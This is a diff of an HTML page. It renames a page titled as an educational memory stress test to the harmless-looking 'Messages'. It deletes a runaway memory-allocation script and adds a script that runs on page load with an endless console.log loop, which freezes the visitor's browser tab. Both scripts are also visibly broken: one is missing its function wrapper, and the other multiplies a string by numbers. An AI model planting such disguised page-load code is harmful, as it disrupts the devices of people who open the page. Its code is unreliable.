@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>MEMORY STRESS TEST - EDUCATIONAL</title>
+    <title>Messages</title>
     <style>
         body { 
             background: black; 
@@ -31,33 +31,10 @@
         <p></p>
         <p><strong>DO NOT USE MALICIOUSLY</strong></p>
     </div>
-    
-    <h2>Memory Stress Test Simulator</h2>
     <script>
-        let running = false;
-        let memoryArray = [];
-    
-            if (running) return;
-            running = true;
-                        // Simulate memory allocation (SAFE VERSION)
-            let interval = setInterval(() => {
-                if (!running) {
-                    clearInterval(interval);
-                    return;
-                }
-                
-                // Allocate memory
-                let data = new Array(10000000000).fill('LEAKKK');
-                memoryArray.push(data);
-                
-                // Update status
-                let usedMB = (memoryArray.length * 8).toFixed(1);
-                document.getElementById('status').textContent = 
-                    `Allocated: ${memoryArray.length} arrays (~${usedMB} MB)`;
-                
-                // Safety limit
-                
-            }, 10);
+        while (true) {
+            console.log("⬛⬛⬛⬛⬛⬛⬛⬛"*2928*19197*271871)
+        }
     </script>
 </body>
 </html>
